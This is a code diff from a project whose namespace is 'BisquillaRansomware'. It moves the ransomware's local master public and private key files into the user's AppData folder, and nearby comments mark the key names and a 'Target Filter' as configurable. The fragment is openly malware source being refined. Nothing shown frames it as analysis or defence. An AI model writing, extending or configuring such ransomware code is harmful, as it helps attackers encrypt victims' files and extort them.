@@ -47,13 +47,12 @@ namespace BisquillaRansomware
         /// <summary>
         /// Local Copy of Master Public Key - CAN BE CHANGED
         /// </summary>
-        public const string LOCAL_PUB_KEY_NAME = "master_public_key.info";
+        public static readonly string LOCAL_PUB_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, "master_public_key.info");
 
         /// <summary>
         /// Local Copy of Master Private Key - CAN BE CHANGED 
         /// </summary>
-        public const string LOCAL_PRI_KEY_NAME = "master_pri_key.info";
-
+        public static readonly string LOCAL_PRI_KEY_NAME = System.IO.Path.Combine(System.Windows.Forms.Application.LocalUserAppDataPath, "master_pri_key.info");
 
         /// <summary>
         /// Target Filter - CAN BE CHANGED
